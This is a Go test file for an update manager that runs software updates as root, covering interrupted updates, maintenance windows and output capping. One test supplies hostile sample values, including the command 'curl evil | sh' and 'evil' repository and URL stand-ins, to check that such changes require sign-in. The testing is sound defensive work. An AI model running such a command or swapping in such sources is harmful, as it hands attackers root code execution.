package updates_test

import (
	"context"
	"errors"
	"fmt"
	"strings"
	"testing"
	"time"

	"nightjar/internal/updates"
)

// An update cut off by a restart (the agent's memory cap, a stop that outlasts systemd's patience)
// is not started again on top of the one still running: the new process waits for what was left
// running, then counts the update as a run whose end it did not see, and checks it again.
func TestAnUpdateCutOffByARestartIsAccountedFor(t *testing.T) {
	store := openStore(t)
	g := newGated(&fakeHost{version: "1.0.0", next: "1.1.0", active: true})
	gh := github(t, "1.1.0").URL
	spec := app
	spec.Auto = true
	before := newManager(t, store, g.run, gh, nil)
	before.Save("", spec)
	settle(t, before, "app", func(s updates.Status) bool { return s.Available })
	g.holdOn("install-app")
	before.Apply("app")
	<-g.started
	t.Cleanup(func() { close(g.release); before.Wait(5 * time.Second) })

	// The process restarts while install-app still runs.
	settled := make(chan struct{})
	waited := make(chan struct{})
	after := updates.New(updates.Options{Store: store, Run: g.run, GitHubAPI: gh, Poll: time.Millisecond, Timeout: time.Minute,
		Settle: func(context.Context) { close(waited); <-settled }}, nil, false)
	<-waited
	st, _ := after.Get("app")
	if st.Busy != "updating" || st.Running == nil || st.Attempted != "1.1.0" {
		t.Fatalf("while what it left runs, the target shows as updating: busy %q running %+v attempted %q", st.Busy, st.Running, st.Attempted)
	}
	after.Tick(time.Now(), time.Hour, updates.Window{})
	close(settled)
	st = settle(t, after, "app", func(s updates.Status) bool { return len(s.Runs) == 1 && s.Checked > 0 })
	run := st.Runs[0]
	if run.OK || run.Auto || run.From != "1.0.0" || !strings.Contains(run.Detail, "restarted") || st.Running != nil {
		t.Fatalf("the cut-off update is a run whose end is not known: %+v (running %+v)", run, st.Running)
	}
	// Still on offer, but already tried: the window does not start it again.
	for range 3 {
		after.Tick(time.Now(), time.Hour, updates.Window{})
	}
	time.Sleep(50 * time.Millisecond)
	if n := g.count("install-app"); n != 1 {
		t.Fatalf("the update ran %d times", n)
	}
}

// A short window (04:00–04:05) can close while the check round it opened still runs. What that
// round finds is installed when it ends, once.
func TestAShortWindowInstallsWhatItsCheckFound(t *testing.T) {
	g := newGated(&fakeHost{version: "1.0.0", next: "1.1.0", active: true})
	m := newManager(t, openStore(t), g.run, github(t, "1.1.0").URL, nil)
	spec := app
	spec.Auto = true
	m.Save("", spec)
	settle(t, m, "app", func(s updates.Status) bool { return s.Available })

	window := updates.MinuteWindow(240, 245)
	at := func(h, min int) time.Time { return time.Date(2026, 3, 10, h, min, 0, 0, time.Local) }
	g.holdOn("app --version")
	m.Tick(at(4, 0), time.Hour, window) // opens the window: a check round first
	<-g.started
	m.Tick(at(4, 2), time.Hour, window)
	m.Tick(at(4, 6), time.Hour, window) // closed, the round still running
	g.holdOn("")
	close(g.release)
	deadline := time.Now().Add(10 * time.Second)
	for checking, _ := m.Activity(); checking; checking, _ = m.Activity() {
		if time.Now().After(deadline) {
			t.Fatal("the round never ended")
		}
		time.Sleep(5 * time.Millisecond)
	}
	if st, _ := m.Get("app"); len(st.Runs) != 0 {
		t.Fatal("nothing installs before the round has ended")
	}
	m.Tick(at(4, 7), time.Hour, window)
	st := settle(t, m, "app", func(s updates.Status) bool { return len(s.Runs) == 1 })
	if !st.Runs[0].OK || !st.Runs[0].Auto {
		t.Fatalf("run: %+v", st.Runs[0])
	}
	// Once: the next closed tick, a day's interval later, has nothing held over.
	m.Tick(at(4, 8), time.Hour, window)
	time.Sleep(50 * time.Millisecond)
	if n := g.count("install-app"); n != 1 {
		t.Fatalf("installed %d times", n)
	}
}

// "settings" names the update schedule's route beside the targets', so no target can have it.
func TestSettingsIsNotATargetID(t *testing.T) {
	if got := updates.Slug("Settings"); got != "settings-target" {
		t.Fatalf("Slug(Settings) = %q", got)
	}
	s, err := updates.ParseSpec([]byte(`{"name":"Settings","kind":"system"}`))
	if err != nil || s.ID != "settings-target" {
		t.Fatalf("%v %+v", err, s)
	}
	m := newManager(t, openStore(t), (&fakeHost{}).run, "", nil)
	if _, err := m.Save("", updates.Spec{ID: "settings", Name: "Anything", Kind: updates.KindSystem}); !errors.Is(err, updates.ErrReservedID) {
		t.Fatalf("an id of settings: %v", err)
	}
	if _, err := m.Save("", s); err != nil {
		t.Fatalf("a target named Settings: %v", err)
	}
}

// What sign-in guards is everything that decides what runs as root or where a stored key goes, and
// a save from the dashboard, which leaves out a release's checked download, changes none of it.
func TestLockedCoversWhatRunsAsRoot(t *testing.T) {
	base := updates.Spec{ID: "qbt", Name: "qBittorrent", Kind: updates.KindRelease, Repo: "a/b", VersionCommand: "v", UpdateCommand: "u", Asset: "x.AppImage", AssetRepo: "c/d", Unit: "qbt"}
	for name, change := range map[string]func(*updates.Spec){
		"asset repo": func(s *updates.Spec) { s.AssetRepo = "evil/release" },
		"asset":      func(s *updates.Spec) { s.Asset = "other.bin" },
		"repo":       func(s *updates.Spec) { s.Repo = "evil/app" },
		"unit":       func(s *updates.Spec) { s.Unit = "ssh" },
		"restart":    func(s *updates.Spec) { s.Restart = true },
		"url":        func(s *updates.Spec) { s.URL = "http://evil.example" },
		"command":    func(s *updates.Spec) { s.UpdateCommand = "curl evil | sh" },
	} {
		s := base
		change(&s)
		if s.KeepUnsent(base).Locked() == base.Locked() {
			t.Errorf("changing the %s is not guarded", name)
		}
	}
	sent := base
	sent.Asset, sent.AssetRepo, sent.Auto, sent.Name = "", "", true, "qBit"
	if sent.KeepUnsent(base).Locked() != base.Locked() {
		t.Error("a save without the download, as the dashboard sends it, reads as a change")
	}
}

// What a command prints is kept up to a limit, its start and its end: a build that prints without
// end must not fill the agent's memory in the middle of an update.
func TestCommandOutputIsCapped(t *testing.T) {
	var b updates.OutputBuffer
	chunk := []byte(strings.Repeat("x", 64<<10))
	b.Write([]byte("START\n"))
	for range 3 * updates.MaxOutput / len(chunk) {
		b.Write(chunk)
	}
	b.Write([]byte("\nEND"))
	if b.Len() > updates.MaxOutput {
		t.Fatalf("kept %d bytes", b.Len())
	}
	s := b.String()
	if !strings.HasPrefix(s, "START\n") || !strings.HasSuffix(s, "\nEND") || !strings.Contains(s, "bytes of output left out") {
		t.Fatalf("kept start %q … end %q", s[:20], s[len(s)-20:])
	}

	// Kept exactly, in odd-sized writes that wrap the end around.
	data := make([]byte, 3*updates.MaxOutput+12345)
	for i := range data {
		data[i] = byte('a' + i%26 + i/7777%3)
	}
	var odd updates.OutputBuffer
	for i := 0; i < len(data); i += 7777 {
		odd.Write(data[i:min(i+7777, len(data))])
	}
	half := updates.MaxOutput / 2
	want := fmt.Sprintf("%s\n… %d bytes of output left out …\n%s", data[:half], len(data)-2*half, data[len(data)-half:])
	if odd.String() != want {
		t.Fatal("the start and end kept are not what was written")
	}

	out, err := updates.Exec(context.Background(), updates.Command{Argv: []string{"sh", "-c", "head -c 20000000 /dev/zero | tr '\\0' a; echo; echo done"}, Timeout: time.Minute})
	if err != nil || len(out.Stdout) > updates.MaxOutput+100 || !strings.HasSuffix(out.Stdout, "done\n") {
		t.Fatalf("kept %d bytes, err %v", len(out.Stdout), err)
	}
}
